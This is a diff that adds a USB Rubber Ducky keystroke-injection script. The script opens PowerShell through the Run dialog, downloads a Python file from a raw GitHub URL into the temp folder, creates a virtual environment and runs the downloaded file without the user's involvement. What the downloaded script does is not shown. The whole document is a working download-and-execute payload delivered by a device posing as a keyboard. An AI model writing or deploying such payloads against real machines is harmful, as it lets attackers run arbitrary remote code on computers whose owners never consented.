@@ -1,0 +1,42 @@
+DEFAULT_DELAY 200
+
+REM Open PowerShell
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 3000
+
+REM Make sure Ducky folder exists
+STRING New-Item -Path "$env:TEMP\Ducky" -ItemType Directory -Force
+ENTER
+DELAY 500
+
+REM Download the Python script
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Samrridh/Ducky/main/main.py" -OutFile "$env:TEMP\Ducky\script.py"
+ENTER
+DELAY 1000
+
+REM Change to working directory
+STRING cd "$env:TEMP\Ducky"
+ENTER
+DELAY 300
+
+REM Create virtual environment
+STRING py -m venv .venv
+ENTER
+DELAY 5000
+
+REM Activate environment
+STRING .\.venv\Scripts\activate
+ENTER
+DELAY 500
+
+REM Install requirements if they exist
+REM STRING pip install -r requirements.txt
+REM ENTER
+REM DELAY 5000
+
+REM Run the script
+STRING py script.py
+ENTER
